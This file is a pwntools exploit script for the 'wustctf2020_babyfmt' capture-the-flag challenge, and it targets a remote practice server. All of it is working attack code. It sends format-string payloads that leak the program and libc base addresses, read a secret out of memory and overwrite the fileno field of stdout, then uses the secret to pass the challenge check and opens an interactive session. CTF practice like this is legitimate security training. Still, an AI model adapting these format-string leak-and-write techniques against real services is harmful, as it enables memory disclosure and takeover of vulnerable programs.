from pwn import *

#context.log_level = 'debug'

#p = process('./wustctf2020_babyfmt')
p = remote('node4.buuoj.cn', 26285)
elf = ELF('wustctf2020_babyfmt')
libc = ELF('libc-2.23.buu.so')

def debug(s):
	gdb.attach(p, '''
		source ~/libc/loadsym.py
		loadsym ~/libc/2.23/64/libc-2.23.debug.so
	''' + s)

ru = lambda s : p.recvuntil(s)
sn = lambda s : p.send(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)
sl = lambda s : p.sendline(s)
rv = lambda s : p.recv(s)

#debug('b *$rebase(0xecc)')
sla(b'time', b'aaa')

sla(b'>>', b'2')
payload = b'%7$hhnaaaa%17$p,,,%23$p'
sl(payload)
ru(b'aaaa')

proc_base = int(rv(14), 16) - elf.sym['main'] - 118
success('proc_base -> {}'.format(hex(proc_base)))
secret_addr = proc_base + 0x202060
ru(b',,,')
libc_base = int(rv(14), 16) - libc.sym['__libc_start_main'] - 240
success('libc_base -> {}'.format(hex(libc_base)))

sla(b'>>', b'2')
payload = b'%7$hhnaaaaa%10$s' + p64(secret_addr)
sl(payload)
ru(b'aaaaa')
secret = rv(0x40)

sla(b'>>', b'2')
stdout_fno = libc_base + libc.sym['_IO_2_1_stdout_'] + 112
payload = b'aa%9$hhn' + p64(stdout_fno)
sl(payload)

sla(b'>>', b'3')
sa(b'door!', secret)
secret = rv(0x40)

p.interactive()
